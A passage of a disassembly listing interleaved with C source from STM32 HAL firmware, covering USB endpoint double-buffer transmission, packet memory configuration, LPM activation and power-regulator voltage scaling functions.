 80034f6:	68bb      	ldr	r3, [r7, #8]
 80034f8:	781b      	ldrb	r3, [r3, #0]
 80034fa:	009b      	lsls	r3, r3, #2
 80034fc:	4413      	add	r3, r2
 80034fe:	881b      	ldrh	r3, [r3, #0]
 8003500:	b29b      	uxth	r3, r3
 8003502:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003506:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800350a:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 800350e:	68fb      	ldr	r3, [r7, #12]
 8003510:	681b      	ldr	r3, [r3, #0]
 8003512:	461a      	mov	r2, r3
 8003514:	68bb      	ldr	r3, [r7, #8]
 8003516:	781b      	ldrb	r3, [r3, #0]
 8003518:	009b      	lsls	r3, r3, #2
 800351a:	441a      	add	r2, r3
 800351c:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8003520:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003524:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003528:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800352c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003530:	b29b      	uxth	r3, r3
 8003532:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 8003534:	68bb      	ldr	r3, [r7, #8]
 8003536:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 800353a:	2b01      	cmp	r3, #1
 800353c:	f040 80ca 	bne.w	80036d4 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 8003540:	68bb      	ldr	r3, [r7, #8]
 8003542:	695a      	ldr	r2, [r3, #20]
 8003544:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003548:	441a      	add	r2, r3
 800354a:	68bb      	ldr	r3, [r7, #8]
 800354c:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 800354e:	68bb      	ldr	r3, [r7, #8]
 8003550:	69da      	ldr	r2, [r3, #28]
 8003552:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003556:	441a      	add	r2, r3
 8003558:	68bb      	ldr	r3, [r7, #8]
 800355a:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 800355c:	68bb      	ldr	r3, [r7, #8]
 800355e:	6a1a      	ldr	r2, [r3, #32]
 8003560:	68bb      	ldr	r3, [r7, #8]
 8003562:	691b      	ldr	r3, [r3, #16]
 8003564:	429a      	cmp	r2, r3
 8003566:	d30b      	bcc.n	8003580 <HAL_PCD_EP_DB_Transmit+0x63e>
        {
          len = ep->maxpacket;
 8003568:	68bb      	ldr	r3, [r7, #8]
 800356a:	691b      	ldr	r3, [r3, #16]
 800356c:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 8003570:	68bb      	ldr	r3, [r7, #8]
 8003572:	6a1a      	ldr	r2, [r3, #32]
 8003574:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003578:	1ad2      	subs	r2, r2, r3
 800357a:	68bb      	ldr	r3, [r7, #8]
 800357c:	621a      	str	r2, [r3, #32]
 800357e:	e017      	b.n	80035b0 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else if (ep->xfer_len_db == 0U)
 8003580:	68bb      	ldr	r3, [r7, #8]
 8003582:	6a1b      	ldr	r3, [r3, #32]
 8003584:	2b00      	cmp	r3, #0
 8003586:	d108      	bne.n	800359a <HAL_PCD_EP_DB_Transmit+0x658>
        {
          len = TxPctSize;
 8003588:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800358c:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 8003590:	68bb      	ldr	r3, [r7, #8]
 8003592:	2200      	movs	r2, #0
 8003594:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003598:	e00a      	b.n	80035b0 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else
        {
          len = ep->xfer_len_db;
 800359a:	68bb      	ldr	r3, [r7, #8]
 800359c:	6a1b      	ldr	r3, [r3, #32]
 800359e:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 80035a2:	68bb      	ldr	r3, [r7, #8]
 80035a4:	2200      	movs	r2, #0
 80035a6:	621a      	str	r2, [r3, #32]
          ep->xfer_fill_db = 0;
 80035a8:	68bb      	ldr	r3, [r7, #8]
 80035aa:	2200      	movs	r2, #0
 80035ac:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
        }

        /* Set the Double buffer counter for pmabuffer1 */
        PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 80035b0:	68fb      	ldr	r3, [r7, #12]
 80035b2:	681b      	ldr	r3, [r3, #0]
 80035b4:	657b      	str	r3, [r7, #84]	; 0x54
 80035b6:	68bb      	ldr	r3, [r7, #8]
 80035b8:	785b      	ldrb	r3, [r3, #1]
 80035ba:	2b00      	cmp	r3, #0
 80035bc:	d165      	bne.n	800368a <HAL_PCD_EP_DB_Transmit+0x748>
 80035be:	68fb      	ldr	r3, [r7, #12]
 80035c0:	681b      	ldr	r3, [r3, #0]
 80035c2:	65fb      	str	r3, [r7, #92]	; 0x5c
 80035c4:	68fb      	ldr	r3, [r7, #12]
 80035c6:	681b      	ldr	r3, [r3, #0]
 80035c8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80035cc:	b29b      	uxth	r3, r3
 80035ce:	461a      	mov	r2, r3
 80035d0:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80035d2:	4413      	add	r3, r2
 80035d4:	65fb      	str	r3, [r7, #92]	; 0x5c
 80035d6:	68bb      	ldr	r3, [r7, #8]
 80035d8:	781b      	ldrb	r3, [r3, #0]
 80035da:	00da      	lsls	r2, r3, #3
 80035dc:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80035de:	4413      	add	r3, r2
 80035e0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80035e4:	65bb      	str	r3, [r7, #88]	; 0x58
 80035e6:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035e8:	881b      	ldrh	r3, [r3, #0]
 80035ea:	b29b      	uxth	r3, r3
 80035ec:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80035f0:	b29a      	uxth	r2, r3
 80035f2:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035f4:	801a      	strh	r2, [r3, #0]
 80035f6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035fa:	2b3e      	cmp	r3, #62	; 0x3e
 80035fc:	d91d      	bls.n	800363a <HAL_PCD_EP_DB_Transmit+0x6f8>
 80035fe:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003602:	095b      	lsrs	r3, r3, #5
 8003604:	66bb      	str	r3, [r7, #104]	; 0x68
 8003606:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800360a:	f003 031f 	and.w	r3, r3, #31
 800360e:	2b00      	cmp	r3, #0
 8003610:	d102      	bne.n	8003618 <HAL_PCD_EP_DB_Transmit+0x6d6>
 8003612:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003614:	3b01      	subs	r3, #1
 8003616:	66bb      	str	r3, [r7, #104]	; 0x68
 8003618:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800361a:	881b      	ldrh	r3, [r3, #0]
 800361c:	b29a      	uxth	r2, r3
 800361e:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8003620:	b29b      	uxth	r3, r3
 8003622:	029b      	lsls	r3, r3, #10
 8003624:	b29b      	uxth	r3, r3
 8003626:	4313      	orrs	r3, r2
 8003628:	b29b      	uxth	r3, r3
 800362a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800362e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003632:	b29a      	uxth	r2, r3
 8003634:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003636:	801a      	strh	r2, [r3, #0]
 8003638:	e041      	b.n	80036be <HAL_PCD_EP_DB_Transmit+0x77c>
 800363a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800363e:	2b00      	cmp	r3, #0
 8003640:	d10a      	bne.n	8003658 <HAL_PCD_EP_DB_Transmit+0x716>
 8003642:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003644:	881b      	ldrh	r3, [r3, #0]
 8003646:	b29b      	uxth	r3, r3
 8003648:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800364c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003650:	b29a      	uxth	r2, r3
 8003652:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003654:	801a      	strh	r2, [r3, #0]
 8003656:	e032      	b.n	80036be <HAL_PCD_EP_DB_Transmit+0x77c>
 8003658:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800365c:	085b      	lsrs	r3, r3, #1
 800365e:	66bb      	str	r3, [r7, #104]	; 0x68
 8003660:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003664:	f003 0301 	and.w	r3, r3, #1
 8003668:	2b00      	cmp	r3, #0
 800366a:	d002      	beq.n	8003672 <HAL_PCD_EP_DB_Transmit+0x730>
 800366c:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800366e:	3301      	adds	r3, #1
 8003670:	66bb      	str	r3, [r7, #104]	; 0x68
 8003672:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003674:	881b      	ldrh	r3, [r3, #0]
 8003676:	b29a      	uxth	r2, r3
 8003678:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800367a:	b29b      	uxth	r3, r3
 800367c:	029b      	lsls	r3, r3, #10
 800367e:	b29b      	uxth	r3, r3
 8003680:	4313      	orrs	r3, r2
 8003682:	b29a      	uxth	r2, r3
 8003684:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003686:	801a      	strh	r2, [r3, #0]
 8003688:	e019      	b.n	80036be <HAL_PCD_EP_DB_Transmit+0x77c>
 800368a:	68bb      	ldr	r3, [r7, #8]
 800368c:	785b      	ldrb	r3, [r3, #1]
 800368e:	2b01      	cmp	r3, #1
 8003690:	d115      	bne.n	80036be <HAL_PCD_EP_DB_Transmit+0x77c>
 8003692:	68fb      	ldr	r3, [r7, #12]
 8003694:	681b      	ldr	r3, [r3, #0]
 8003696:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800369a:	b29b      	uxth	r3, r3
 800369c:	461a      	mov	r2, r3
 800369e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80036a0:	4413      	add	r3, r2
 80036a2:	657b      	str	r3, [r7, #84]	; 0x54
 80036a4:	68bb      	ldr	r3, [r7, #8]
 80036a6:	781b      	ldrb	r3, [r3, #0]
 80036a8:	00da      	lsls	r2, r3, #3
 80036aa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80036ac:	4413      	add	r3, r2
 80036ae:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80036b2:	653b      	str	r3, [r7, #80]	; 0x50
 80036b4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80036b8:	b29a      	uxth	r2, r3
 80036ba:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80036bc:	801a      	strh	r2, [r3, #0]

        /* Copy the user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr1, (uint16_t)len);
 80036be:	68fb      	ldr	r3, [r7, #12]
 80036c0:	6818      	ldr	r0, [r3, #0]
 80036c2:	68bb      	ldr	r3, [r7, #8]
 80036c4:	6959      	ldr	r1, [r3, #20]
 80036c6:	68bb      	ldr	r3, [r7, #8]
 80036c8:	895a      	ldrh	r2, [r3, #10]
 80036ca:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80036ce:	b29b      	uxth	r3, r3
 80036d0:	f004 fee7 	bl	80084a2 <USB_WritePMA>
      }
    }
  }

  /*enable endpoint IN*/
  PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_VALID);
 80036d4:	68fb      	ldr	r3, [r7, #12]
 80036d6:	681b      	ldr	r3, [r3, #0]
 80036d8:	461a      	mov	r2, r3
 80036da:	68bb      	ldr	r3, [r7, #8]
 80036dc:	781b      	ldrb	r3, [r3, #0]
 80036de:	009b      	lsls	r3, r3, #2
 80036e0:	4413      	add	r3, r2
 80036e2:	881b      	ldrh	r3, [r3, #0]
 80036e4:	b29b      	uxth	r3, r3
 80036e6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80036ea:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80036ee:	82bb      	strh	r3, [r7, #20]
 80036f0:	8abb      	ldrh	r3, [r7, #20]
 80036f2:	f083 0310 	eor.w	r3, r3, #16
 80036f6:	82bb      	strh	r3, [r7, #20]
 80036f8:	8abb      	ldrh	r3, [r7, #20]
 80036fa:	f083 0320 	eor.w	r3, r3, #32
 80036fe:	82bb      	strh	r3, [r7, #20]
 8003700:	68fb      	ldr	r3, [r7, #12]
 8003702:	681b      	ldr	r3, [r3, #0]
 8003704:	461a      	mov	r2, r3
 8003706:	68bb      	ldr	r3, [r7, #8]
 8003708:	781b      	ldrb	r3, [r3, #0]
 800370a:	009b      	lsls	r3, r3, #2
 800370c:	441a      	add	r2, r3
 800370e:	8abb      	ldrh	r3, [r7, #20]
 8003710:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003714:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003718:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800371c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003720:	b29b      	uxth	r3, r3
 8003722:	8013      	strh	r3, [r2, #0]

  return HAL_OK;
 8003724:	2300      	movs	r3, #0
}
 8003726:	4618      	mov	r0, r3
 8003728:	3790      	adds	r7, #144	; 0x90
 800372a:	46bd      	mov	sp, r7
 800372c:	bd80      	pop	{r7, pc}

0800372e <HAL_PCDEx_PMAConfig>:
  * @retval HAL status
  */

HAL_StatusTypeDef  HAL_PCDEx_PMAConfig(PCD_HandleTypeDef *hpcd, uint16_t ep_addr,
                                       uint16_t ep_kind, uint32_t pmaadress)
{
 800372e:	b480      	push	{r7}
 8003730:	b087      	sub	sp, #28
 8003732:	af00      	add	r7, sp, #0
 8003734:	60f8      	str	r0, [r7, #12]
 8003736:	607b      	str	r3, [r7, #4]
 8003738:	460b      	mov	r3, r1
 800373a:	817b      	strh	r3, [r7, #10]
 800373c:	4613      	mov	r3, r2
 800373e:	813b      	strh	r3, [r7, #8]
  PCD_EPTypeDef *ep;

  /* initialize ep structure*/
  if ((0x80U & ep_addr) == 0x80U)
 8003740:	897b      	ldrh	r3, [r7, #10]
 8003742:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8003746:	b29b      	uxth	r3, r3
 8003748:	2b00      	cmp	r3, #0
 800374a:	d00b      	beq.n	8003764 <HAL_PCDEx_PMAConfig+0x36>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800374c:	897b      	ldrh	r3, [r7, #10]
 800374e:	f003 0307 	and.w	r3, r3, #7
 8003752:	1c5a      	adds	r2, r3, #1
 8003754:	4613      	mov	r3, r2
 8003756:	009b      	lsls	r3, r3, #2
 8003758:	4413      	add	r3, r2
 800375a:	00db      	lsls	r3, r3, #3
 800375c:	68fa      	ldr	r2, [r7, #12]
 800375e:	4413      	add	r3, r2
 8003760:	617b      	str	r3, [r7, #20]
 8003762:	e009      	b.n	8003778 <HAL_PCDEx_PMAConfig+0x4a>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 8003764:	897a      	ldrh	r2, [r7, #10]
 8003766:	4613      	mov	r3, r2
 8003768:	009b      	lsls	r3, r3, #2
 800376a:	4413      	add	r3, r2
 800376c:	00db      	lsls	r3, r3, #3
 800376e:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8003772:	68fa      	ldr	r2, [r7, #12]
 8003774:	4413      	add	r3, r2
 8003776:	617b      	str	r3, [r7, #20]
  }

  /* Here we check if the endpoint is single or double Buffer*/
  if (ep_kind == PCD_SNG_BUF)
 8003778:	893b      	ldrh	r3, [r7, #8]
 800377a:	2b00      	cmp	r3, #0
 800377c:	d107      	bne.n	800378e <HAL_PCDEx_PMAConfig+0x60>
  {
    /* Single Buffer */
    ep->doublebuffer = 0U;
 800377e:	697b      	ldr	r3, [r7, #20]
 8003780:	2200      	movs	r2, #0
 8003782:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaadress = (uint16_t)pmaadress;
 8003784:	687b      	ldr	r3, [r7, #4]
 8003786:	b29a      	uxth	r2, r3
 8003788:	697b      	ldr	r3, [r7, #20]
 800378a:	80da      	strh	r2, [r3, #6]
 800378c:	e00b      	b.n	80037a6 <HAL_PCDEx_PMAConfig+0x78>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  else /* USB_DBL_BUF */
  {
    /* Double Buffer Endpoint */
    ep->doublebuffer = 1U;
 800378e:	697b      	ldr	r3, [r7, #20]
 8003790:	2201      	movs	r2, #1
 8003792:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaaddr0 = (uint16_t)(pmaadress & 0xFFFFU);
 8003794:	687b      	ldr	r3, [r7, #4]
 8003796:	b29a      	uxth	r2, r3
 8003798:	697b      	ldr	r3, [r7, #20]
 800379a:	811a      	strh	r2, [r3, #8]
    ep->pmaaddr1 = (uint16_t)((pmaadress & 0xFFFF0000U) >> 16);
 800379c:	687b      	ldr	r3, [r7, #4]
 800379e:	0c1b      	lsrs	r3, r3, #16
 80037a0:	b29a      	uxth	r2, r3
 80037a2:	697b      	ldr	r3, [r7, #20]
 80037a4:	815a      	strh	r2, [r3, #10]
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 80037a6:	2300      	movs	r3, #0
}
 80037a8:	4618      	mov	r0, r3
 80037aa:	371c      	adds	r7, #28
 80037ac:	46bd      	mov	sp, r7
 80037ae:	f85d 7b04 	ldr.w	r7, [sp], #4
 80037b2:	4770      	bx	lr

080037b4 <HAL_PCDEx_ActivateLPM>:
  * @brief  Activate LPM feature.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCDEx_ActivateLPM(PCD_HandleTypeDef *hpcd)
{
 80037b4:	b480      	push	{r7}
 80037b6:	b085      	sub	sp, #20
 80037b8:	af00      	add	r7, sp, #0
 80037ba:	6078      	str	r0, [r7, #4]

  USB_TypeDef *USBx = hpcd->Instance;
 80037bc:	687b      	ldr	r3, [r7, #4]
 80037be:	681b      	ldr	r3, [r3, #0]
 80037c0:	60fb      	str	r3, [r7, #12]
  hpcd->lpm_active = 1U;
 80037c2:	687b      	ldr	r3, [r7, #4]
 80037c4:	2201      	movs	r2, #1
 80037c6:	f8c3 22ec 	str.w	r2, [r3, #748]	; 0x2ec
  hpcd->LPM_State = LPM_L0;
 80037ca:	687b      	ldr	r3, [r7, #4]
 80037cc:	2200      	movs	r2, #0
 80037ce:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0

  USBx->LPMCSR |= USB_LPMCSR_LMPEN;
 80037d2:	68fb      	ldr	r3, [r7, #12]
 80037d4:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 80037d8:	b29b      	uxth	r3, r3
 80037da:	f043 0301 	orr.w	r3, r3, #1
 80037de:	b29a      	uxth	r2, r3
 80037e0:	68fb      	ldr	r3, [r7, #12]
 80037e2:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54
  USBx->LPMCSR |= USB_LPMCSR_LPMACK;
 80037e6:	68fb      	ldr	r3, [r7, #12]
 80037e8:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 80037ec:	b29b      	uxth	r3, r3
 80037ee:	f043 0302 	orr.w	r3, r3, #2
 80037f2:	b29a      	uxth	r2, r3
 80037f4:	68fb      	ldr	r3, [r7, #12]
 80037f6:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54

  return HAL_OK;
 80037fa:	2300      	movs	r3, #0
}
 80037fc:	4618      	mov	r0, r3
 80037fe:	3714      	adds	r7, #20
 8003800:	46bd      	mov	sp, r7
 8003802:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003806:	4770      	bx	lr

08003808 <HAL_PWR_EnableBkUpAccess>:
  * @note  LSEON bit that switches on and off the LSE crystal belongs as well to the
  *        back-up domain.
  * @retval None
  */
void HAL_PWR_EnableBkUpAccess(void)
{
 8003808:	b480      	push	{r7}
 800380a:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR1, PWR_CR1_DBP);
 800380c:	4b05      	ldr	r3, [pc, #20]	; (8003824 <HAL_PWR_EnableBkUpAccess+0x1c>)
 800380e:	681b      	ldr	r3, [r3, #0]
 8003810:	4a04      	ldr	r2, [pc, #16]	; (8003824 <HAL_PWR_EnableBkUpAccess+0x1c>)
 8003812:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003816:	6013      	str	r3, [r2, #0]
}
 8003818:	bf00      	nop
 800381a:	46bd      	mov	sp, r7
 800381c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003820:	4770      	bx	lr
 8003822:	bf00      	nop
 8003824:	40007000 	.word	0x40007000

08003828 <HAL_PWREx_GetVoltageRange>:
  * @brief Return Voltage Scaling Range.
  * @retval VOS bit field (PWR_REGULATOR_VOLTAGE_SCALE1 or PWR_REGULATOR_VOLTAGE_SCALE2
  *         or PWR_REGULATOR_VOLTAGE_SCALE1_BOOST when applicable)
  */
uint32_t HAL_PWREx_GetVoltageRange(void)
{
 8003828:	b480      	push	{r7}
 800382a:	af00      	add	r7, sp, #0
    else
    {
      return PWR_REGULATOR_VOLTAGE_SCALE1_BOOST;
    }
#else
  return  (PWR->CR1 & PWR_CR1_VOS);
 800382c:	4b04      	ldr	r3, [pc, #16]	; (8003840 <HAL_PWREx_GetVoltageRange+0x18>)
 800382e:	681b      	ldr	r3, [r3, #0]
 8003830:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
#endif
}
 8003834:	4618      	mov	r0, r3
 8003836:	46bd      	mov	sp, r7
 8003838:	f85d 7b04 	ldr.w	r7, [sp], #4
 800383c:	4770      	bx	lr
 800383e:	bf00      	nop
 8003840:	40007000 	.word	0x40007000

08003844 <HAL_PWREx_ControlVoltageScaling>:
  *        cleared before returning the status. If the flag is not cleared within
  *        50 microseconds, HAL_TIMEOUT status is reported.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_PWREx_ControlVoltageScaling(uint32_t VoltageScaling)
{
 8003844:	b480      	push	{r7}
 8003846:	b085      	sub	sp, #20
 8003848:	af00      	add	r7, sp, #0
 800384a:	6078      	str	r0, [r7, #4]
  }

#else

  /* If Set Range 1 */
  if (VoltageScaling == PWR_REGULATOR_VOLTAGE_SCALE1)
 800384c:	687b      	ldr	r3, [r7, #4]
 800384e:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8003852:	d130      	bne.n	80038b6 <HAL_PWREx_ControlVoltageScaling+0x72>
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE1)
 8003854:	4b23      	ldr	r3, [pc, #140]	; (80038e4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003856:	681b      	ldr	r3, [r3, #0]
 8003858:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 800385c:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8003860:	d038      	beq.n	80038d4 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 1 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE1);
 8003862:	4b20      	ldr	r3, [pc, #128]	; (80038e4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003864:	681b      	ldr	r3, [r3, #0]
 8003866:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 800386a:	4a1e      	ldr	r2, [pc, #120]	; (80038e4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 800386c:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8003870:	6013      	str	r3, [r2, #0]

      /* Wait until VOSF is cleared */
      wait_loop_index = ((PWR_FLAG_SETTING_DELAY_US * SystemCoreClock) / 1000000U) + 1U;
 8003872:	4b1d      	ldr	r3, [pc, #116]	; (80038e8 <HAL_PWREx_ControlVoltageScaling+0xa4>)
 8003874:	681b      	ldr	r3, [r3, #0]
 8003876:	2232      	movs	r2, #50	; 0x32
 8003878:	fb02 f303 	mul.w	r3, r2, r3
 800387c:	4a1b      	ldr	r2, [pc, #108]	; (80038ec <HAL_PWREx_ControlVoltageScaling+0xa8>)
 800387e:	fba2 2303 	umull	r2, r3, r2, r3
 8003882:	0c9b      	lsrs	r3, r3, #18
 8003884:	3301      	adds	r3, #1
 8003886:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003888:	e002      	b.n	8003890 <HAL_PWREx_ControlVoltageScaling+0x4c>
      {
        wait_loop_index--;
 800388a:	68fb      	ldr	r3, [r7, #12]
 800388c:	3b01      	subs	r3, #1
 800388e:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003890:	4b14      	ldr	r3, [pc, #80]	; (80038e4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003892:	695b      	ldr	r3, [r3, #20]
 8003894:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003898:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 800389c:	d102      	bne.n	80038a4 <HAL_PWREx_ControlVoltageScaling+0x60>
 800389e:	68fb      	ldr	r3, [r7, #12]
 80038a0:	2b00      	cmp	r3, #0
 80038a2:	d1f2      	bne.n	800388a <HAL_PWREx_ControlVoltageScaling+0x46>
      }
      if (HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF))
 80038a4:	4b0f      	ldr	r3, [pc, #60]	; (80038e4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80038a6:	695b      	ldr	r3, [r3, #20]
 80038a8:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80038ac:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 80038b0:	d110      	bne.n	80038d4 <HAL_PWREx_ControlVoltageScaling+0x90>
      {
        return HAL_TIMEOUT;
 80038b2:	2303      	movs	r3, #3
 80038b4:	e00f      	b.n	80038d6 <HAL_PWREx_ControlVoltageScaling+0x92>
      }
    }
  }
  else
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE2)
 80038b6:	4b0b      	ldr	r3, [pc, #44]	; (80038e4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80038b8:	681b      	ldr	r3, [r3, #0]
 80038ba:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 80038be:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 80038c2:	d007      	beq.n	80038d4 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 2 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE2);
 80038c4:	4b07      	ldr	r3, [pc, #28]	; (80038e4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80038c6:	681b      	ldr	r3, [r3, #0]
 80038c8:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 80038cc:	4a05      	ldr	r2, [pc, #20]	; (80038e4 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80038ce:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 80038d2:	6013      	str	r3, [r2, #0]
      /* No need to wait for VOSF to be cleared for this transition */
    }
  }
#endif

  return HAL_OK;
 80038d4:	2300      	movs	r3, #0
}
 80038d6:	4618      	mov	r0, r3
 80038d8:	3714      	adds	r7, #20
 80038da:	46bd      	mov	sp, r7
 80038dc:	f85d 7b04 	ldr.w	r7, [sp], #4
 80038e0:	4770      	bx	lr
 80038e2:	bf00      	nop
 80038e4:	40007000 	.word	0x40007000
 80038e8:	20000000 	.word	0x20000000
 80038ec:	431bde83 	.word	0x431bde83

080038f0 <HAL_PWREx_EnableVddUSB>:
  * @brief Enable VDDUSB supply.
  * @note  Remove VDDUSB electrical and logical isolation, once VDDUSB supply is present.
  * @retval None
  */
void HAL_PWREx_EnableVddUSB(void)
{
 80038f0:	b480      	push	{r7}
 80038f2:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR2, PWR_CR2_USV);
 80038f4:	4b05      	ldr	r3, [pc, #20]	; (800390c <HAL_PWREx_EnableVddUSB+0x1c>)
 80038f6:	685b      	ldr	r3, [r3, #4]
 80038f8:	4a04      	ldr	r2, [pc, #16]	; (800390c <HAL_PWREx_EnableVddUSB+0x1c>)
 80038fa:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 80038fe:	6053      	str	r3, [r2, #4]
}
 8003900:	bf00      	nop
 8003902:	46bd      	mov	sp, r7
 8003904:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003908:	4770      	bx	lr
 800390a:	bf00      	nop
 800390c:	40007000 	.word	0x40007000

